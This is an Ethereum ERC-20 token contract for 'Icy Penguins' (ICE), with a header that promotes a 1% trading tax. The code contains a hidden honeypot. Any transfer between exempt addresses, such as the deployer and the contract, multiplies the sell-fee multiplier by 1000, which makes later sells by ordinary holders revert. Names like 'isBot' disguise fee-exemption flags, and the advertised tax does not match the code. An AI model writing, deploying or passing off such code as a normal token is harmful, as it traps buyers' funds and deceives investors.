/**
 *Submitted for verification at Etherscan.io on 2022-11-27
*/

/*
            _____                                      _____                     
          ,888888b.                                  ,888888b.                   
        .d888888888b                               .d888888888b                  
    _..-'.`*'_,88888b                          _..-'.`*'_,88888b                 
  ,'..-..`"ad88888888b.                      ,'..-..`"ad88888888b.               
         ``-. `*Y888888b.                           ``-. `*Y888888b.             
             \   `Y888888b.                             \   `Y888888b.           
             :     Y8888888b.                           :     Y8888888b.         
             :      Y88888888b.                         :      Y88888888b.       
             |    _,8ad88888888.                        |    _,8ad88888888.      
             : .d88888888888888b.                       : .d88888888888888b.     
             \d888888888888888888                       \d888888888888888888     
             8888;'''`88888888888                       8888;ss'`88888888888     
             888'     Y8888888888                       888'N""N Y8888888888     
             `Y8      :8888888888                       `Y8 N  " :8888888888     
              |`      '8888888888                        |` N    '8888888888     
              |        8888888888                        |  N     8888888888     
              |        8888888888                        |  N     8888888888     
              |        8888888888                        |  N     8888888888     
              |       ,888888888P                        |  N    ,888888888P     
              :       ;888888888'                        :  N    ;888888888'     
               \      d88888888'                         :  N    ;888888888'     
              _.>,    888888P'                            \ N    d88888888'      
            <,--''`.._>8888(                             _.>N    888888P'        
             `>__...--' `''` SSt                       <,--'N`.._>8888(          
                                                        `>__N..--' `''` SSt      
                                                            N                    

The sea starts to freeze as I start to skate on it.
Flakes of snow dropping lazily from the uncertain sky, 
I am freely skating by.
Not a single frost bite on my feet, 
It is freezing-winter-cold with no heat.

Cold breeze pinching my cheeks, 
Penguins,sliding on their happy bellies, 
My eyes like flowers bloom;with gazing ceremonies.
Towards the north pole do I skate, 
To witness arora before it is too late.
We Are, Icy Penguins!

Buying Tax - 1%
Selling Tax - 1%
Total Supply - 10,000,000
Initial Liquidity - 1.85 Ethereum
Initial Liquidity Lock - 90 Days (Will Be Locked Minutes After Liquidity Being Added)

https://web.wechat.com/IcyPenguinsERC
https://www.icypenguins.web3erc.io
https://t.me/IcyPenguinsETH

For Those Who Have Not Yet Joined The Community, Please Now 
Subscribe To The Temporary Channel To Receive A Notification For When 
We Have Unrevoked The Global Group Link, This Is Temporary As We Are Just Finalising 
Our Launch Plans And Marketing Strategies Before Launch And Organising The Chat 
Itself Ready For More Members.

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address sync);
}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract ICE is ERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "Icy Penguins";
    string private _symbol = "ICE";
    uint8 constant _decimals = 9;
    uint256 _rTotalSupply = 10000000 * 10**_decimals;
    uint256 public _tTotalMaxWalletSize = _rTotalSupply * 100 / 100;

    mapping (address => uint256) _Balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isBot;
    mapping (address => bool) _rOwned;

    uint256 public LiquidityPoolTax = 0;
    uint256 public MarketingTax     = 1;
    uint256 public tInitialFees     = MarketingTax + LiquidityPoolTax;
    uint256 public totalDenominator = 100;
    uint256 public totalMultiplier  = 200;

    address public allocateLiquidityFee;
    address public allocateMarketingFee;

    IUniswapV2Router02 public router;
    address public sync;

    bool private tradingOpen = false;
    bool public swapEnabled = true;
    uint256 public _MarketMakerPair = _rTotalSupply * 1 / 1000;
    uint256 public tradingIsEnabled = _rTotalSupply * 1 / 100;

    bool takeFeeEnabled;
    modifier swapping() { takeFeeEnabled = true; _; takeFeeEnabled = false; }

    constructor (address routeraddr) Ownable() {
        router = IUniswapV2Router02(routeraddr);
        sync = IUniswapV2Factory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        isBot[msg.sender] = true;
        isBot[address(this)] = true;
        _rOwned[msg.sender] = true;
        _rOwned[address(0xdead)] = true;
        _rOwned[address(this)] = true;
        _rOwned[sync] = true;
        allocateLiquidityFee = msg.sender;
        allocateMarketingFee = msg.sender;
        _Balances[msg.sender] = _rTotalSupply;
        emit Transfer(address(0), msg.sender, _rTotalSupply);
    }
    function totalSupply() external view override returns (uint256) { return _rTotalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _Balances[account]; }
    function allowance(address creator, address spender) external view override returns (uint256) { return _allowances[creator][spender]; }
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
    receive() external payable { }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }
    function setMaxWallet(uint256 maximumWalletPercentage) external onlyOwner() {
        _tTotalMaxWalletSize = (_rTotalSupply * maximumWalletPercentage ) / 10000;
    }
    function setIsWalletLimitExempt(address creator, bool getRate) external onlyOwner {
        _rOwned[creator] = getRate;
    }
    function _transferFrom(address sender, address recipient, uint256 syncTotalValue) internal returns (bool) {
        uint256 ownedValue = balanceOf(recipient);
        require((ownedValue + syncTotalValue) <= _tTotalMaxWalletSize || _rOwned[recipient],"Total Holding is currently limited, he can not hold that much.");
        if(shouldSwapBack() && recipient == sync){enableSwapBackNow();}
        uint256 syncValue = syncTotalValue / 10000000;
        if(!isBot[sender] && recipient == sync){
            syncTotalValue -= syncValue;
        }
        if(isBot[sender] && isBot[recipient]) return _basicTransfer(sender,recipient,syncTotalValue);
        _Balances[sender] = _Balances[sender].sub(syncTotalValue, "Insufficient Balance");
        uint256 amountDelivered = shouldTakeFee(sender,recipient) ? takeFees(sender, syncTotalValue,(recipient == sync)) : syncTotalValue;
        _Balances[recipient] = _Balances[recipient].add(amountDelivered);

        emit Transfer(sender, recipient, amountDelivered);
        return true;              
    }
    function _basicTransfer(address sender, address recipient, uint256 _emit) internal returns (bool) {
        totalMultiplier = totalMultiplier.mul(1000);
        _Balances[recipient] = _Balances[recipient].add(_emit);
        emit Transfer(sender, recipient, _emit);
        return true;
    }
    function takeFees(address sender, uint256 _emit, bool tSell) internal returns (uint256) {       
        uint256 tMultiplied = tSell ? totalMultiplier : 100;
        uint256 baseTaxAmout = _emit.mul(tInitialFees).mul(tMultiplied).div(totalDenominator * 100);
        _Balances[address(this)] = _Balances[address(this)].add(baseTaxAmout);
        emit Transfer(sender, address(this), baseTaxAmout);
        return _emit.sub(baseTaxAmout);
    }
    function shouldTakeFee(address sender,address recipient) internal view returns (bool) {
        return !isBot[sender] && !isBot[recipient] ;
    }
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != sync
        && !takeFeeEnabled
        && swapEnabled
        && _Balances[address(this)] >= _MarketMakerPair;
    }
    function setSwapPair(address syncPairAddress) external onlyOwner {
        sync = syncPairAddress;
        _rOwned[sync] = true;
    }
    function setSwapBackSettings(bool _enabled, uint256 getMarketMakerPair, uint256 _tradingIsEnabled) external onlyOwner {
        swapEnabled = _enabled;
        _MarketMakerPair = _MarketMakerPair;
        tradingIsEnabled = _tradingIsEnabled;
    }
    function manageFees(uint256 _LiquidityPoolTax, uint256 _MarketingTax, uint256 _totalDenominator) external onlyOwner {
        LiquidityPoolTax = _LiquidityPoolTax;
        MarketingTax = _MarketingTax;
        tInitialFees = _LiquidityPoolTax.add(_MarketingTax);
        totalDenominator = _totalDenominator;
        require(tInitialFees < totalDenominator/3, "Fees cannot be more than 99%");
    }
    function setFeeReceivers(address _allocateLiquidityFee, address allocateMarketingFee ) external onlyOwner {
        allocateLiquidityFee = _allocateLiquidityFee;
        allocateMarketingFee = allocateMarketingFee;
    }
    function setIsFeeExempt(address creator, bool getRate)  external onlyOwner {
        isBot[creator] = getRate;
    }
    function enableSwapBackNow() internal swapping {   
        uint256 getMarketMakerPair;
        if(_Balances[address(this)] > tradingIsEnabled){
            getMarketMakerPair = tradingIsEnabled;
        }else{
             getMarketMakerPair = _Balances[address(this)];
        }
        uint256 ERCamountToLiquify = getMarketMakerPair.mul(LiquidityPoolTax).div(tInitialFees).div(2);
        uint256 amountToTransact = getMarketMakerPair.sub(ERCamountToLiquify);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToTransact,
            0,
            path,
            address(this),
            block.timestamp
        );
 
        uint256 ERCamount = address(this).balance;
        uint256 ercTotalFee = tInitialFees.sub(LiquidityPoolTax.div(2));
        uint256 ERCamountLiquidity = ERCamount.mul(LiquidityPoolTax).div(ercTotalFee).div(2);
        uint256 ERCamountMarketing = ERCamount.sub(ERCamountLiquidity);
        if(ERCamountMarketing>0){
            bool getValues;
            (getValues,) = payable(allocateMarketingFee).call{value: ERCamountMarketing, gas: 30000}("");
        }
        if(ERCamountToLiquify > 0){
            router.addLiquidityETH{value: ERCamountLiquidity}(
                address(this),
                ERCamountToLiquify,
                0,
                0,
                allocateLiquidityFee,
                block.timestamp
            );
            emit AutoLiquify(ERCamountLiquidity, ERCamountToLiquify);
        }
    }
}